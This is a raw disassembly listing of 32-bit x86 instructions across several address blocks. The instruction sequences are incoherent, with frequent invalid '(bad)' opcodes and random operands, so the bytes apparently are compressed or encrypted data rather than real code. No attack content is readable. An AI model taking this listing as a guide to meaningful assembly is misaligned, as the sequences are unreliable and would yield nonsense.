  416bf3:	mov    dl,0xf7
  416bf5:	jp     0x416c47
  416bf7:	xor    bl,al
  416bf9:	fistp  QWORD PTR [esi+0x7cd6cd7f]
  416bff:	sub    bh,BYTE PTR [ecx+ecx*4-0x7f]
  416c03:	fs adc DWORD PTR es:[esi],ebx
  416c07:	adc    edi,DWORD PTR [ebx]
  416c09:	hlt    
  416c0a:	sub    dh,ah
  416c0c:	fxch   st(0)
  416c0e:	jp     0x416c45
  416c10:	ja     0x416c53
  416c12:	dec    ebp
  416c13:	ins    DWORD PTR es:[edi],dx
  416c14:	and    esp,esp
  416c16:	cmp    dl,dh
  416c18:	rol    DWORD PTR [ebp+0x146425e8],0x80
  416c1f:	std    
  416c20:	push   cs
  416c21:	dec    esp
  416c22:	push   ss
  416c23:	jo     0x416ca0
  416c25:	mov    al,ds:0x1ef1bf91
  416c2a:	fwait
  416c2b:	aad    0xd8
  416c2d:	mov    dh,0x3b
  416c2f:	inc    ebx
  416c30:	mov    bh,BYTE PTR [edi-0x268d0613]
  416c36:	and    BYTE PTR [edi+0x23],al
  416c39:	mov    DWORD PTR [edi+0x7d6a8aa7],edi
  416c3f:	jo     0x416c5b
  416c41:	mov    ebx,DWORD PTR [esi]
  416c43:	fmul   DWORD PTR [ecx+0x3a]
  416c46:	in     eax,0x82
  416c48:	inc    esi
  416c49:	in     eax,0x76
  416c4b:	ja     0x416cc1
  416c4d:	and    BYTE PTR [edi-0x4ebfa5f8],al
  416c53:	adc    ebp,DWORD PTR [esi+0x4]
  416c56:	enter  0x489c,0x61
  416c5a:	sbb    edx,DWORD PTR [ebx-0x620f4dcb]
  416c60:	dec    eax
  416c61:	stc    
  416c62:	test   DWORD PTR [ebx+eax*8+0x50],edi
  416c66:	xor    esp,DWORD PTR ds:0xd5ff34d6
  416c6c:	cmp    edx,edi
  416c6e:	inc    esp
  416c6f:	call   FWORD PTR [ebx-0x45]
  416c72:	pop    esp
  416c73:	clc    
  416c74:	mov    edx,0x52aa453
  416c79:	add    eax,0x9aa619
  416c7e:	mov    edi,0x7ba68ad8
  416c83:	fcom   st(1)
  416c85:	mov    DWORD PTR [esi-0x280204a3],esi
  416c8b:	sti    
  416c8c:	mov    ebp,0xd87f4ff2
  416c91:	xchg   BYTE PTR [edi+ebp*8-0x326cf85d],al
  416c98:	xchg   ecx,eax
  416c99:	inc    edi
  416c9a:	outs   dx,DWORD PTR ds:[esi]
  416c9b:	rcr    DWORD PTR es:[edx-0xc86308],cl
  416ca2:	repnz aad 0xbf
  416ca5:	cmp    DWORD PTR [edx+0xc],esi
  416ca8:	ret    0x652a
  416cab:	iret   
  416cac:	outs   dx,DWORD PTR ds:[esi]
  416cad:	clc    
  416cae:	repnz leave 
  416cb0:	push   cs
  416cb1:	mov    bh,0x55
  416cb3:	lock mov al,ds:0x0
	...
  416d15:	add    BYTE PTR [ecx],ah
  416d17:	xchg   ebx,eax
  416d18:	mov    DWORD PTR [edi-0x60d84045],ebp
  416d1e:	or     DWORD PTR ds:0xa22080c9,edi
  416d24:	cmp    eax,DWORD PTR [esi+eax*8-0x12]
  416d28:	add    BYTE PTR [eax],al
  416d2a:	pop    es
  416d2b:	add    DWORD PTR [eax],eax
  416d2d:	add    BYTE PTR [esp+ebp*2],ch
  416d30:	scas   al,BYTE PTR es:[edi]
  416d31:	sub    eax,0x1e2ef3d3
  416d36:	ret    
  416d37:	adc    ecx,esp
  416d39:	add    al,0xb4
  416d3b:	std    
  416d3c:	or     eax,0x9fa67cc0
  416d41:	das    
  416d42:	cmp    al,0x55
  416d44:	add    DWORD PTR [ebx-0x7a],esp
  416d47:	imul   ebx,DWORD PTR [esi+0x5bfc85cb],0xffffffdd
  416d4e:	push   ss
  416d4f:	ja     0x416d59
  416d51:	cwde   
  416d52:	mov    WORD PTR [eax+0x41],ds
  416d55:	dec    ecx
  416d56:	rol    cl,0x74
  416d59:	fsubr  st,st(1)
  416d5b:	repz add DWORD PTR ds:0x568dfd51,ebp
  416d62:	pop    edx
  416d63:	fwait
  416d64:	cs pop eax
  416d66:	je     0x416dc1
  416d68:	(bad)  
  416d6a:	sbb    DWORD PTR gs:[eax+eax*2+0x6c],edi
  416d6f:	pop    edx
  416d70:	push   es
  416d71:	dec    esi
  416d72:	ins    BYTE PTR es:[edi],dx
  416d73:	sbb    BYTE PTR [esi+0x7b],ch
  416d76:	add    esi,DWORD PTR [eax-0x79fd7f11]
  416d7c:	out    0x48,al
  416d7e:	mov    ecx,DWORD PTR [edx]
  416d80:	mov    dh,0x1d
  416d82:	stc    
  416d83:	fcom   QWORD PTR ds:0x64b7d2b
  416d89:	jo     0x416d20
  416d8b:	adc    al,0x38
  416d8d:	pop    eax
  416d8e:	cdq    
  416d8f:	mov    fs,WORD PTR [ecx]
  416d91:	ret    0x429
  416d94:	call   0xe956:0x58761500
  416d9b:	fld    st(2)
  416d9d:	xlat   BYTE PTR ds:[ebx]
  416d9e:	ss pop edx
  416da0:	enter  0xc0a9,0xb4
  416da4:	loope  0x416df6
  416da6:	loope  0x416d55
  416da8:	sub    BYTE PTR [edx-0x13a4355a],ah
  416dae:	gs mov eax,0x3db1abe4
  416db4:	push   edx
  416db5:	sub    eax,DWORD PTR [ebx+0x1]
  416db8:	lock iret 
  416dba:	mov    ds:0xf781378f,al
  416dbf:	pop    ebx
  416dc0:	mov    ebx,0x4b8ab69c
  416dc5:	sahf   
  416dc6:	hlt    
  416dc7:	mov    esi,0xee822cca
  416dcc:	pushf  
  416dcd:	mov    esi,0x7ae35bc5
  416dd2:	loopne 0x416dc3
  416dd4:	rol    BYTE PTR [edi],1
  416dd6:	sbb    eax,0xb3fbc926
  416ddb:	xchg   ebp,eax
  416ddc:	ss ja  0x416dd6
  416ddf:	lods   al,BYTE PTR ds:[esi]
  416de0:	shl    bh,1
  416de2:	or     DWORD PTR [ebp+0x76dc263f],eax
  416de8:	fimul  DWORD PTR [ebx+0x31e06716]
  416dee:	fldcw  WORD PTR [ecx+0x49]
  416df1:	mov    ebx,0xcf4fdb96
  416df6:	(bad)  
  416df7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416df8:	jnp    0x416d85
  416dfa:	mov    bh,BYTE PTR [ebp+edi*2-0x3add4bee]
  416e01:	pop    es
  416e02:	pop    ss
  416e03:	int    0x47
  416e05:	ja     0x416dfb
  416e07:	ins    DWORD PTR es:[edi],dx
  416e08:	adc    BYTE PTR [edi-0x72],cl
  416e0b:	mov    bl,0xd9
  416e0d:	sbb    BYTE PTR [eax],dl
  416e0f:	push   ds
  416e10:	push   ecx
  416e11:	stos   BYTE PTR es:[edi],al
  416e12:	scas   al,BYTE PTR es:[edi]
  416e13:	loope  0x416dfe
  416e15:	sub    eax,0x336e842d
  416e1a:	fmul   st,st(5)
  416e1c:	loope  0x416dfa
  416e1e:	shr    DWORD PTR [edx-0x1a],cl
  416e21:	lds    esp,FWORD PTR [edi-0x48]
  416e24:	sub    cl,0xf1
  416e27:	stos   BYTE PTR es:[edi],al
  416e28:	and    edx,esi
  416e2a:	ds ins BYTE PTR es:[edi],dx
  416e2c:	jecxz  0x416e69
  416e2e:	mov    ds:0xb4c6f189,al
  416e33:	test   dh,dl
	...
  416e95:	add    BYTE PTR [edi-0x519271e7],bh
  416e9b:	(bad)  
  416e9c:	(bad)  
  416e9d:	(bad)  
  416e9f:	fstp   QWORD PTR [edx+ecx*8+0x3e0a191a]
  416ea6:	int    0xef
  416ea8:	add    BYTE PTR [eax],al
  416eaa:	pop    es
  416eab:	add    DWORD PTR [eax],eax
  416ead:	add    BYTE PTR ds:0x3766a3d3,bl
  416eb3:	xlat   BYTE PTR ds:[ebx]
  416eb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416eb5:	lods   eax,DWORD PTR ds:[esi]
  416eb6:	(bad)  
  416eb7:	adc    ebx,edx
  416eb9:	cmc    
  416eba:	fdivr  st(3),st
  416ebc:	(bad)  
  416ebd:	sbb    BYTE PTR [edi+0x103b910f],ch
  416ec3:	and    eax,0x253f4cac
  416ec8:	cdq    
  416ec9:	inc    eax
  416eca:	(bad)  
  416ecb:	ins    DWORD PTR es:[edi],dx
  416ecc:	sub    eax,0xaf309764
  416ed1:	mov    eax,0x36e293f2
  416ed6:	pop    eax
  416ed7:	xor    DWORD PTR [eax+0x24c443cd],ecx
  416edd:	icebp  
  416ede:	stos   DWORD PTR es:[edi],eax
  416edf:	push   ecx
  416ee0:	or     al,0x3d
  416ee2:	aam    0xeb
  416ee4:	xchg   BYTE PTR [edx],dl
  416ee6:	(bad)  
  416ee7:	mul    ecx
  416ee9:	adc    al,BYTE PTR ds:0x8f72c6bb
  416eef:	jno    0x416e7a
  416ef1:	jae    0x416f10
  416ef3:	pop    es
  416ef4:	into   
  416ef5:	pop    DWORD PTR [edi+0x9]
  416ef8:	ffree  st(0)
  416efa:	dec    ecx
  416efb:	xchg   edi,eax
  416efc:	out    dx,al
  416efd:	ret    0x2275
  416f00:	into   
  416f01:	mov    ebx,0x23003061
  416f06:	adc    BYTE PTR [esi+0xa5845b3],0x33
  416f0d:	cmp    edi,0xffffff91
  416f10:	and    al,0xa3
  416f12:	fs inc eax
  416f14:	sbb    eax,0x75827a3f
  416f19:	aas    
  416f1a:	mov    dl,0x73
  416f1c:	push   edx
  416f1d:	mov    ebp,0x94368c2d
  416f22:	push   cs
  416f23:	pop    ebx
  416f24:	push   ebx
  416f25:	xchg   bh,dh
  416f27:	dec    esp
  416f28:	or     DWORD PTR [eax+0x2b],edi
  416f2b:	pop    esp
  416f2c:	fsub   st,st(5)
  416f2e:	inc    ebx
  416f2f:	ret    0xa9c3
  416f32:	test   al,bl
  416f34:	xor    ecx,DWORD PTR [eax-0x2e]
  416f37:	inc    edx
  416f38:	addr16 test bl,cl
  416f3b:	dec    ebx
  416f3c:	stc    
  416f3d:	inc    ebp
  416f3e:	cmp    bh,bl
  416f40:	fwait
  416f41:	std    
  416f42:	mov    eax,0xfa08a084
  416f47:	mov    WORD PTR [ecx*4-0xd0d8252],es
  416f4e:	jmp    0xecec:0xa5f94bc
  416f55:	push   ebp
  416f56:	sub    bl,al
  416f58:	lods   al,BYTE PTR ds:[esi]
  416f59:	aam    0x45
  416f5b:	repnz lds edx,FWORD PTR [ecx-0x34]
  416f5f:	sbb    DWORD PTR [eax-0x1b],edx
  416f62:	bound  edx,QWORD PTR [edi+eiz*8-0x7104ad3d]
  416f69:	dec    bx
  416f6b:	jne    0x416fd4
  416f6d:	shr    BYTE PTR [ecx],1
  416f6f:	jb     0x416f68
  416f71:	popf   
  416f72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f73:	loopne 0x416f95
  416f75:	mov    ebx,0xa2d18c13
  416f7a:	mov    ecx,0x7e68c08d
  416f7f:	xor    DWORD PTR [edi-0x1],esp
  416f82:	inc    esi
  416f83:	inc    edi
  416f84:	inc    eax
  416f85:	pop    ebp
  416f86:	pop    ds
  416f87:	dec    edx
  416f88:	mov    eax,ds:0x11cb6825
  416f8d:	pusha  
  416f8e:	push   edi
  416f8f:	push   ebx
  416f90:	mov    WORD PTR [ebx-0x602a1c29],gs
  416f96:	shr    BYTE PTR [esi+0x460110fb],0xaf
  416f9d:	mov    ds:0x7b35562c,eax
  416fa2:	ins    DWORD PTR es:[edi],dx
  416fa3:	jecxz  0x416fb7
  416fa5:	dec    eax
  416fa6:	sbb    BYTE PTR [esi+0x47],0xae
  416faa:	dec    ebx
  416fab:	enter  0x4475,0xbe
  416faf:	or     esp,edx
  416fb1:	mov    cl,0xa0
  416fb3:	xchg   DWORD PTR [eax+eax*1],ecx
	...
  417016:	jbe    0x417045
  417018:	push   ebp
  417019:	inc    ecx
  41701a:	pop    edi
  41701b:	jns    0x417093
  41701d:	aas    
  41701e:	lods   al,BYTE PTR ds:[esi]
  41701f:	fmul   QWORD PTR [eax-0x50]
  417022:	or     ebx,DWORD PTR [edx+0x5d]
  417025:	or     eax,0xf0d4
  41702a:	pop    es
  41702b:	add    DWORD PTR [eax],eax
  41702d:	add    BYTE PTR [esi],ch
  41702f:	inc    eax
  417030:	push   edi
  417031:	cmp    al,0xa0
  417033:	add    DWORD PTR [ebx+ecx*8+0x0],esp
  417037:	jmp    0x96e8:0x40b85cbb
  41703e:	leave  
  41703f:	xchg   edx,eax
  417040:	adc    ebx,edi
  417042:	mov    cl,0x65
  417044:	retf   0x8e24
  417047:	dec    eax
  417048:	in     al,dx
  417049:	pushf  
  41704a:	jp     0x417051
  41704c:	sbb    eax,0x55b7206c
  417051:	pop    ebx
  417052:	adc    al,0xe5
  417054:	imul   edx,DWORD PTR [ebp+0xfb94ad3],0x27
  41705b:	dec    esp
  41705c:	pslld  mm1,QWORD PTR [ecx-0x4c]
  417060:	ret    0x97c9
  417063:	test   eax,0x844b2c8e
  417068:	lods   eax,DWORD PTR ds:[esi]
  417069:	shl    edx,cl
  41706b:	mov    bh,0x2d
  41706d:	(bad)  
  41706e:	hlt    
  41706f:	or     DWORD PTR [edx],edi
  417071:	jmp    0x6c5a:0x35fc9ff0
  417078:	pop    ds
  417079:	pop    eax
  41707a:	sar    BYTE PTR [eax-0xe],0xda
  41707e:	mov    DWORD PTR [eax-0x4553fc72],edi
  417084:	push   edx
  417085:	shr    DWORD PTR [edx+esi*4+0x72],cl
  417089:	(bad)  
  41708a:	arpl   WORD PTR [edx+0x64d4b86],bx
  417090:	jecxz  0x4170a7
  417092:	mov    eax,DWORD PTR [ebx]
  417094:	push   edi
  417095:	push   ebp
  417096:	pop    eax
  417097:	call   0xb0c:0x4adbcd6b
  41709e:	mov    cl,0x7a
  4170a0:	inc    BYTE PTR [edx]
  4170a2:	push   ds
  4170a3:	popa   
  4170a4:	(bad)  
  4170a5:	(bad)  [ecx]
  4170a7:	pop    ebp
  4170a8:	arpl   WORD PTR ds:0xf2d37058,bp
  4170ae:	imul   ecx,DWORD PTR [eax-0x7ab03256],0xe2faddd1
  4170b8:	inc    ebx
  4170b9:	enter  0x511c,0x1
  4170bd:	inc    esi
  4170be:	iret   
  4170bf:	ds pop edi
  4170c1:	jns    0x4170a7
  4170c3:	cwde   
  4170c4:	inc    ebp
  4170c5:	or     edx,DWORD PTR [eax-0x4bbeb5dc]
  4170cb:	cmp    DWORD PTR [edi+0x65],edx
  4170ce:	mov    al,ds:0x4ac0db67
  4170d3:	sbb    dh,dh
  4170d5:	imul   BYTE PTR [esi]
  4170d7:	fcomip st,st(7)
  4170d9:	repnz dec esp
  4170db:	retf   
  4170dc:	pop    ds
  4170dd:	ins    DWORD PTR es:[edi],dx
  4170de:	add    esi,esp
  4170e0:	xlat   BYTE PTR ds:[ebx]
  4170e1:	pop    edi
  4170e2:	ror    DWORD PTR ds:0xb0866e91,1
  4170e8:	push   edx
  4170e9:	stos   BYTE PTR es:[edi],al
  4170ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4170eb:	inc    ecx
  4170ec:	jnp    0x417147
  4170ee:	ret    
  4170ef:	in     al,0x9c
  4170f1:	imul   ebp,DWORD PTR [edx+0x5],0x3
  4170f5:	retf   0xf6f7
  4170f8:	pop    edi
  4170f9:	inc    eax
  4170fa:	aaa    
  4170fb:	(bad)  
  4170fd:	sub    BYTE PTR [eax-0x19a4065d],ah
  417103:	jle    0x4170ee
  417105:	out    dx,eax
  417106:	pop    eax
  417107:	inc    edx
  417108:	test   al,0xeb
  41710a:	sub    al,0x54
  41710c:	aas    
  41710d:	jae    0x4170f7
  41710f:	test   BYTE PTR [edi],ch
  417111:	nop
  417112:	sbb    bl,BYTE PTR [edx-0x3e]
  417115:	jl     0x4170fe
  417117:	mov    dh,BYTE PTR [ebp+0x19]
  41711a:	out    dx,al
  41711b:	jnp    0x417180
  41711d:	inc    edi
  41711e:	push   0xffffffbc
  417120:	inc    esi
  417121:	xchg   esi,eax
  417122:	fild   QWORD PTR [edx]
  417124:	jns    0x4170c2
  417126:	xchg   esi,eax
  417127:	pop    ecx
  417128:	ret    0x6237
  41712b:	xor    esp,edx
  41712d:	xchg   edi,eax
  41712e:	in     al,0x98
  417130:	clc    
  417131:	bts    DWORD PTR [eax],esi
  417134:	push   ds
	...
  417195:	add    BYTE PTR [esi-0xe58fe7],ah
  41719b:	jnp    0x41718b
  41719d:	mov    ebp,0x5dd8ff3
  4171a2:	in     eax,0xb3
  4171a4:	adc    eax,0xf1db67
  4171a9:	add    BYTE PTR [edi],al
  4171ab:	add    DWORD PTR [eax],eax
  4171ad:	add    BYTE PTR [ebp-0x25],bh
  4171b0:	mov    al,ds:0xb2139e3b
  4171b5:	cmp    eax,0x7161fd2f
  4171ba:	aaa    
  4171bb:	xchg   edi,eax
  4171bc:	aad    0x6d
  4171be:	stc    
  4171bf:	push   edi
  4171c0:	push   ebx
  4171c1:	push   edx
  4171c2:	and    DWORD PTR [eax-0x1e],0xffffffbc
  4171c6:	push   ecx
  4171c7:	bound  edi,QWORD PTR [edi]
  4171c9:	mov    ch,BYTE PTR [ecx*1+0x635f2b45]
  4171d0:	jmp    0x417241
  4171d2:	stos   BYTE PTR es:[edi],al
  4171d3:	ins    BYTE PTR es:[edi],dx
  4171d4:	xor    BYTE PTR [esi-0x62],cl
  4171d7:	push   0x65
  4171d9:	dec    ebx
  4171da:	popf   
  4171db:	cld    
  4171dc:	jmp    0xcdb4:0x4353db9b
  4171e3:	shl    DWORD PTR [ecx+0xa72cf82],1
  4171e9:	test   DWORD PTR [eax+0x17d10d00],0x60da5fb1
  4171f3:	jae    0x4171b2
  4171f5:	pushf  
  4171f6:	sub    al,0x70
  4171f8:	inc    ecx
  4171f9:	fwait
  4171fa:	jmp    0xf60e3e8e
  4171ff:	xchg   ebp,eax
  417200:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  417202:	xchg   esi,eax
  417203:	push   0x6d
  417205:	push   es
  417206:	xchg   esp,eax
  417207:	dec    ebp
  417208:	push   ds
  417209:	or     eax,0x3b266c3c
  41720e:	pop    edi
  41720f:	lock in al,dx
  417211:	js     0x41722d
  417213:	cmp    al,0xf
  417215:	or     ebx,DWORD PTR [ebx-0x3]
  417218:	ins    BYTE PTR es:[edi],dx
  417219:	ds add eax,0x244d5931
  41721f:	mov    esp,?
  417221:	xchg   ebp,eax
  417222:	enter  0x78c1,0xb9
  417226:	jb     0x4171ec
  417228:	pop    edx
  417229:	mov    ebx,0x4fabcec
  41722e:	jns    0x4172af
  417230:	xchg   ebp,eax
  417231:	xchg   ebp,eax
  417232:	adc    BYTE PTR [ebx],dl
  417234:	and    esp,DWORD PTR [ebx]
  417236:	ret    
  417237:	mov    bl,0xeb
  417239:	sub    ebp,DWORD PTR [esp+ecx*4]
  41723c:	inc    ebx
  41723d:	aad    0x2d
  41723f:	push   0x5a
  417241:	test   al,0x9a
  417243:	fst    DWORD PTR [ebx]
  417245:	aaa    
  417246:	in     al,0x84
  417248:	mov    al,ds:0xdf664cc
  41724d:	rol    BYTE PTR [eax-0x63b1f9d0],0xf4
  417254:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417255:	jp     0x417285
  417257:	jg     0x417233
  417259:	cmp    BYTE PTR [esi],al
  41725b:	out    0x74,al
  41725d:	sub    BYTE PTR [edx-0x1],al
  417260:	nop
  417261:	fs mov ebx,0xc30ddd58
  417267:	mov    ebp,0x90ba40c0
  41726c:	pop    es
  41726d:	test   eax,0xc9e878ae
  417272:	xchg   edi,eax
  417273:	cmp    dh,bh
  417275:	xchg   esp,eax
  417276:	loop   0x4172a6
  417278:	int    0xd7
  41727a:	out    0x7,eax
  41727c:	jno    0x4172b7
  41727e:	ins    BYTE PTR es:[edi],dx
  41727f:	sbb    DWORD PTR [edi],0xfffffffc
  417282:	scas   al,BYTE PTR es:[edi]
  417283:	jb     0x417265
  417285:	lods   al,BYTE PTR ds:[esi]
  417286:	or     ah,ch
  417288:	dec    eax
  417289:	and    BYTE PTR [edx],bl
  41728b:	rcl    BYTE PTR [ebp+0x78e45535],1
  417291:	jl     0x4172b7
  417293:	mov    bh,0x14
  417295:	xchg   esp,eax
  417296:	adc    ecx,esi
  417298:	xchg   edi,eax
  417299:	out    0x15,al
  41729b:	xchg   edx,eax
  41729c:	stos   BYTE PTR es:[edi],al
  41729d:	mov    cl,0x0
  41729f:	push   ds
  4172a0:	pusha  
  4172a1:	jae    0x41731c
  4172a3:	(bad)  
  4172a4:	jp     0x4172f2
  4172a6:	mov    edx,0x71320c3b
  4172ab:	xor    BYTE PTR [ebx+eax*8+0x51],bh
  4172af:	pop    edi
  4172b0:	dec    edx
  4172b1:	das    
  4172b2:	mov    bh,BYTE PTR [edx-0x3b]
	...
  417315:	add    BYTE PTR [ecx-0x44],ch
  417318:	xlat   BYTE PTR ds:[ebx]
  417319:	pop    esi
  41731a:	xlat   BYTE PTR ds:[ebx]
  41731b:	jg     0x417306
  41731d:	mov    edi,0x85e5bf4a
  417322:	xor    ch,BYTE PTR [edi]
  417324:	stc    
  417325:	pop    esp
  417326:	loop   0x41731a
  417328:	add    BYTE PTR [eax],al
  41732a:	pop    es
  41732b:	add    DWORD PTR [eax],eax
  41732d:	add    BYTE PTR [edx-0x4a01db2c],dl
  417333:	pop    eax
  417334:	jg     0x41734f
  417336:	jbe    0x417354
  417338:	dec    eax
  417339:	mov    ebp,0xbe59cd46
  41733e:	sub    BYTE PTR [ebp+0x2],al
  417341:	and    BYTE PTR [esi],ah
  417343:	out    0xb,al
  417345:	fiadd  DWORD PTR [edx-0x1e]
  417348:	imul   esp,DWORD PTR [ebx-0x1f556048],0xce3a8f99
  417352:	scas   eax,DWORD PTR es:[edi]
  417353:	outs   dx,BYTE PTR ds:[esi]
  417354:	fild   QWORD PTR [esi]
  417356:	or     BYTE PTR [ebp-0x4db02063],ch
  41735c:	mov    ebp,0x6fd7963c
  417361:	ficomp WORD PTR [ebx+edi*2-0x2c2b9c73]
  417368:	imul   ebx,DWORD PTR [esi],0x6880f4ac
  41736e:	cmp    al,0xc4
  417370:	mov    eax,ds:0xe85babbe
  417375:	ss out dx,al
  417377:	jle    0x41731f
  417379:	inc    ebp
  41737a:	xor    eax,0xb83ab5e0
  41737f:	xchg   DWORD PTR ds:0xec88ce14,ecx
  417385:	jbe    0x417340
  417387:	sbb    ch,ch
  417389:	test   BYTE PTR [eax-0x6],0x47
  41738d:	(bad)
  417390:	outs   dx,BYTE PTR ds:[esi]
  417391:	pusha  
  417392:	outs   dx,BYTE PTR ds:[esi]
  417393:	xlat   BYTE PTR ds:[ebx]
  417394:	test   eax,0xb90178b5
  417399:	inc    esi
  41739a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41739b:	jno    0x417326
  41739d:	mov    ch,0x20
  41739f:	jmp    0x41734e
  4173a1:	pop    es
  4173a2:	sub    BYTE PTR [ebx-0x4460ee80],bl
  4173a8:	enter  0xd163,0x5d
  4173ac:	gs scas al,BYTE PTR es:[edi]
  4173ae:	mov    dh,0xfc
  4173b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4173b1:	test   al,0x1a
  4173b3:	ins    BYTE PTR es:[edi],dx
  4173b4:	push   ebx
  4173b5:	fnsave [edx]
  4173b7:	mov    ds:0x7df23c79,al
  4173bc:	test   eax,0x356aec91
  4173c1:	mov    ebp,0x38529401
  4173c7:	mov    BYTE PTR [edx],dl
  4173c9:	push   edx
  4173ca:	add    DWORD PTR [ebx],esi
  4173cc:	mov    DWORD PTR [edi+0x5e],eax
  4173cf:	clc    
  4173d0:	xchg   DWORD PTR [ebp+0x70],ebx
  4173d3:	sbb    edx,DWORD PTR [ebp+0x389e0b1a]
  4173d9:	jecxz  0x417391
  4173db:	(bad)  
  4173dc:	imul   ebp,DWORD PTR [eax+0x31a51270],0xffffffcc
  4173e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4173e4:	fdivr  st(6),st
  4173e6:	out    0xe0,al
  4173e8:	xchg   DWORD PTR [ebp+0x786ab3a4],esp
  4173ee:	push   cs
  4173ef:	(bad)  
  4173f0:	jg     0x4173c7
  4173f2:	imul   esp,DWORD PTR [edx],0xf9e39120
  4173f8:	mov    edx,DWORD PTR [edi+0x1af82831]
  4173fe:	mov    edi,DWORD PTR [edi+0xfb27386]
  417404:	fwait
  417405:	(bad)  
  417406:	enter  0x4c5b,0x31
  41740a:	push   ecx
  41740b:	stos   BYTE PTR es:[edi],al
  41740c:	mov    al,ds:0x55a09cbe
  417411:	xchg   ecx,eax
  417412:	push   cs
  417413:	inc    ebx
  417414:	(bad)  
  417415:	cmovs  esi,DWORD PTR [edi-0x65]
  417419:	pop    edi
  41741a:	fsub   st(5),st
  41741c:	sti    
  41741d:	pusha  
  41741e:	lods   eax,DWORD PTR ds:[esi]
  41741f:	push   esi
  417420:	push   es
  417421:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417422:	jns    0x4173e6
  417424:	test   DWORD PTR [ebp+0xd86c744],0xcb7790d1
  41742e:	outs   dx,BYTE PTR ds:[esi]
  41742f:	dec    edi
  417430:	(bad)  
  417431:	bound  dx,DWORD PTR [eax-0x61]
	...
  417495:	add    BYTE PTR [ecx+0x6b0c6aba],dl
  41749b:	fdivr  st(7),st
  41749d:	mov    edi,0x6bda61d2
  4174a2:	pop    esi
  4174a3:	pop    ss
  4174a4:	jmp    0x417507
  4174a6:	jmp    0x741759e
  4174ab:	add    DWORD PTR [eax],eax
  4174ad:	add    BYTE PTR ds:0x4fcea53,cl
  4174b3:	pop    ecx
  4174b4:	add    al,0xac
  4174b6:	adc    eax,0xece0577a
  4174bb:	inc    esi
  4174bc:	jns    0x4174f6
  4174be:	jge    0x4174e5
  4174c0:	int    0x3d
  4174c2:	pop    es
  4174c3:	mov    bl,0x26
  4174c5:	sbb    al,0x95
  4174c7:	mov    ebx,0xebdb5a80
  4174cc:	mov    ch,BYTE PTR [ebp-0x5063642c]
  4174d2:	cdq    
  4174d3:	push   ebx
  4174d4:	push   0x30
  4174d6:	test   al,cl
  4174d8:	mov    ebx,DWORD PTR [ebx-0x4307e1c4]
  4174de:	jmp    0xf8dd1826
  4174e3:	inc    edi
  4174e4:	sbb    BYTE PTR ds:0x17de6ff5,cl
  4174ea:	aas    
  4174eb:	pop    ebp
  4174ec:	shl    DWORD PTR [edi],1
  4174ee:	mov    ds:0x8dd5e88e,eax
  4174f3:	jmp    0x4174d9
  4174f5:	pop    ecx
  4174f6:	cmp    ecx,ecx
  4174f8:	std    
  4174f9:	xchg   DWORD PTR [esi+0x3c],ebx
  4174fc:	xchg   BYTE PTR [ecx-0x48],ch
  4174ff:	ja     0x41757f
  417501:	aas    
  417502:	scas   eax,DWORD PTR es:[edi]
  417503:	pop    ebx
  417504:	in     al,dx
  417505:	inc    ebx
  417506:	and    dh,ch
  417508:	sbb    edx,DWORD PTR [ebp+0x2b]
  41750b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41750c:	adc    DWORD PTR [esi-0x31],edx
  41750f:	lock mov ecx,0x649d3f7e
  417515:	jle    0x417505
  417517:	inc    edi
  417518:	push   ecx
  417519:	pop    eax
  41751a:	out    0x49,eax
  41751c:	jbe    0x417557
  41751e:	in     al,0xd0
  417520:	in     eax,0x3f
  417522:	sar    dl,0xcb
  417525:	or     eax,0xa340030e
  41752a:	sbb    ecx,edi
  41752c:	jnp    0x4174b0
  41752e:	ja     0x6c982f6e
  417534:	rcl    cl,0xe4
  417537:	not    DWORD PTR [edx]
  417539:	mul    DWORD PTR [edi]
  41753b:	daa    
  41753c:	ret    0xd1f5
  41753f:	push   ecx
  417540:	pop    esp
  417541:	or     al,0x14
  417543:	stc    
  417544:	inc    esp
  417545:	aam    0x96
  417547:	sub    ecx,esi
  417549:	xor    esp,DWORD PTR [esi]
  41754b:	int    0x1a
  41754d:	pop    ecx
  41754e:	(bad)  
  417550:	out    0x2c,al
  417552:	inc    eax
  417553:	mov    eax,ds:0xeae61f57
  417558:	cwde   
  417559:	stc    
  41755a:	jo     0x417584
  41755c:	push   ecx
  41755d:	push   edi
  41755e:	jno    0x417527
  417560:	cmp    bl,BYTE PTR [edx-0xa644536]
  417566:	aaa    
  417567:	jp     0x417522
  417569:	fsubr  DWORD PTR [ecx+edi*4+0x2ad1aa61]
  417570:	int    0xee
  417572:	fs fwait
  417574:	in     eax,0x14
  417576:	cmp    eax,0x207bb53d
  41757b:	hlt    
  41757c:	aas    
  41757d:	test   DWORD PTR [ecx-0x758035ea],edx
  417583:	iret   
  417584:	popa   
  417585:	fdivr  DWORD PTR gs:[esi+0x1b9320fd]
  41758c:	(bad)  
  41758e:	aas    
  41758f:	sub    dh,ch
  417591:	call   DWORD PTR [ebx+0x4]
  417594:	pop    es
  417595:	xchg   esi,eax
  417596:	sub    eax,DWORD PTR [esi+0x540d735]
  41759c:	mov    WORD PTR [ebp-0xa],fs
  41759f:	sbb    dl,BYTE PTR [edi+0x5c89aac6]
  4175a5:	pop    es
  4175a6:	rol    eax,1
  4175a8:	in     eax,dx
  4175a9:	test   DWORD PTR [edx+0x3bc501e4],edi
  4175af:	mov    cl,0x32
  4175b1:	xor    al,0x30
  4175b3:	fwait
  4175b4:	stos   DWORD PTR es:[edi],eax
	...
  417615:	add    BYTE PTR [ecx-0x20b02c99],ch
  41761b:	(bad)  
  41761c:	mov    ebp,0x670b0ae7
  417621:	fcomp  st(6)
  417623:	stc    
  417624:	adc    al,0xbb
  417626:	lock hlt 
  417628:	add    BYTE PTR [eax],al
  41762a:	pop    es
  41762b:	add    DWORD PTR [eax],eax
  41762d:	add    BYTE PTR [ebp+eax*8-0x5629106e],al
  417634:	dec    eax
  417635:	jg     0x417619
  417637:	cmp    al,0x21
